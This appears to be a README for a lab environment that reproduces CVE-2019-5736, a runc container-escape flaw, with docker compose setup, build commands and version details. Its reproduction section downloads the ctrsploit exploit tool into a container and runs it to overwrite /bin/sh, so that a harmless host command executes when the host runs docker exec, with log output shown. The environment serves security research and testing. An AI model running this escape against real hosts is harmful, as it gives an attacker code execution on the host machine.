# cve-2019-5736

* dqd:
  * ssst0n3/docker_archive:cve-2019-5736 -> ssst0n3/docker_archive:cve-2019-5736_v0.1.0
  * ssst0n3/docker_archive:cve-2019-5736_v0.1.0
* ctr:
  * ssst0n3/docker_archive:ctr_cve-2019-5736 -> ssst0n3/docker_archive:ctr_cve-2019-5736_v0.1.0
  * ssst0n3/docker_archive:ctr_cve-2019-5736_v0.1.0

## usage

```shell
$ cd vul/cve-2019-5736
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

### reproduce

terminal 1

```shell
root@cve-2019-5736:~# docker run --name poc -ti ubuntu:16.04 bash
root@b54c1cd02517:/# wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
root@b54c1cd02517:/# chmod +x /usr/bin/ctrsploit
root@c4602d14a7f8:/# ctrsploit vul 5736 x exec -c 'touch /escaped'
INFO[0000] Overwritten /bin/sh successfully             
INFO[0000] Waiting the host to exec container /bin/sh ... 
```

terminal 2

```shell
root@cve-2019-5736:~# docker exec -ti poc /bin/sh
```

terminal 1

```shell
root@c4602d14a7f8:/# ctrsploit vul 5736 x exec -c 'touch /escaped'
INFO[0000] Overwritten /bin/sh successfully             
INFO[0000] Waiting the host to exec container /bin/sh ... 
INFO[0000] Found the PID: 22                            
INFO[0000] Successfully got the file handle             
INFO[0000] Successfully got write handle&{0xc00009a060} 
INFO[0000] The command executed is#!/bin/bash
touch /escaped
root@c4602d14a7f8:/# exit
-rw-r--r-- 1 root root 0 Oct 14 08:49 /escaped
```


### env details

```shell
root@cve-2019-5736:~# docker --version
Docker version 17.06.0-ce, build 02c1d87
root@cve-2019-5736:~# docker-runc --version
runc version 1.0.0-rc3
commit: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4
spec: 1.0.0-rc5
```

## build

```shell
make all DIR=vul/cve-2019-5736
```

for developers:

```dockerfile
FROM ssst0n3/docker_archive:ctr_cve-2019-5736_v0.1.0
```
